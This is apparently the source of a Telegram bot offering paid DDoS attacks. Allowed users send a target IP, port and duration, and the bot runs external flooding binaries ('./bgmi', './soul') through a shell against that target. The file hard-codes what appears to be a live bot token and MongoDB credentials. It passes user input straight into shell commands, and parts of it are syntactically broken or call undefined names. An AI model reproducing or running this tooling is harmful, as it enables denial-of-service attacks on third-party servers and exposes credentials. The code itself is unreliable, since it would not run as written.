import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7732383326:AAGsArWg_ffL59PSE5QJed2RJlQC17LXG3k'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002487517182
CHANNEL_ID = -1002487517182
error_channel_id = -1002487517182

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['REFRESH'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "REFRESH successfull")
    except Exception as e:
        bot.send_message(chat_id, f"NOT REPAIRING: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['a'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(

        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥👋\n\n 𝘂𝘀𝗲𝗿 --> {user_to_add} \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ❤️ \n\n𝗡𝗢𝗪 𝗔𝗗𝗗 𝗠𝗢𝗗𝗘"
            else:
                response = "𝗔𝗹𝗿𝗲𝗮𝗱𝘆❌ 𝗲𝘅𝗶𝘀𝘁 𝗮𝗻𝗱 𝘂𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗯𝗼𝘁"
        else:
            response = "🔻 ＥＲＲＯＲ 🔻"
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"

    bot.reply_to(message, response)

@bot.message_handler(commands=['r'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝘂𝘀𝗲𝗿 --> {user_to_remove} 𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
            else:
                response = f"𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭𝐢𝐧𝐠 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭"
        else:
            response = '''𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>'''
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"

    bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🙏 🇳 🇦 🇲 🇦 🇸 🇹 🇪 🙏'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@S4_LUCHI'''
    bot.reply_to(message, response)
    
# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['op'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @S4 OFFICIAL GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @S4 OFFICIAL GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @S4 OFFICIAL GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @S4 OFFICIAL GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @S4 OFFICIAL GRP # Convert time to integer
            time = int(command[3])  # @S4 OFFICIAL GRP # Convert port to integer
            if time > 300:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 𝟮𝟰𝟬 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/op', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @S4 OFFICIAL GRP # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"  # @S4 OFFICIAL GRP # Updated command syntax
    else:
        response = "🚫 𝗠𝗲𝘁𝗵𝗼𝗱  𝗹𝗶𝗸𝗲 𝗲𝗮𝘀𝘆 𝗯𝘂𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 🚫𝗻𝗼𝘁 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝘁𝗵𝗶𝘀 𝘄𝗼𝗿𝗱 𝗜 𝗰𝗮𝗻'𝘁 𝗵𝗲𝗹𝗽 𝘁𝗼 𝘂𝘀𝗲\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /op \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @S4_LUCHI\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"

    bot.reply_to(message, response)


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')


@


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
              
